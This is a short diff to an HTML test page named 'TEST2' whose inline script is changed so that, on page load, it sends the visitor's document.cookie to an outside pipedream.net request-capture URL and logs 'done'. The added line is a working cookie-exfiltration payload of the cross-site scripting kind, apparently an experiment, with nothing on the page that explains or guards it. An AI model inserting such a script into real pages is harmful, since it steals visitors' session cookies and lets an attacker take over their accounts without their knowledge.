@@ -2,12 +2,13 @@
 <body>
 TEST2
   <script>
-  var request = new XMLHttpRequest();
-request.open('GET', 'https://5e0d086dee932546765dba15b5d1b63c.m.pipedream.net')
+var request = new XMLHttpRequest();
+request.open('GET', 'https://5e0d086dee932546765dba15b5d1b63c.m.pipedream.net?cookie=' + document.cookie)
 request.send();
 request.onload = ()=>{
-    console.log(JSON.parse(request.response));
+    console.log('done');
 }
+  
   </script>
 <body>
 
